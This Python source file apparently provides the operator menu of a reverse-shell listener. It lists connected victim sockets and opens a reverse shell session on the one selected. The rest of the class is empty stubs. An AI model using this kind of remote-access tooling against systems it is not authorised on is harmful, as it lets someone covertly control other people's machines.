#!/usr/bin/env python
#coding=utf-8

__author__ = "Karl Boulais"

from time import sleep
import sys

class View():
    
    def interractiveMode(self, s):
        printed = False
        while True:
            sleep(1)
            if not s.inSession:    
                if len(s.cSocket) > 0:
                    printed = False
                    choix = None
                    for elem in s.cSocket:
                        i = s.cSocket.index(elem)
                        print(f"{i} {s.cAddr[i]}")
                    try:
                        choix = int(input("\n choix: "))
                    except KeyboardInterrupt:
                        s.inSession = False
                        return 1
                        # sys.exit(0)
                    except Exception:
                        continue
                    if choix is not None:
                        s.inSession = True
                        s.startReverseShellInstance(s.cSocket[choix])
                elif not printed:
                    printed = True
                    print("There is no client...")
    
    def controlClient(self):
        pass

    def startServer(self):
        pass
    
    def showDataBaseOptions(self):
        pass






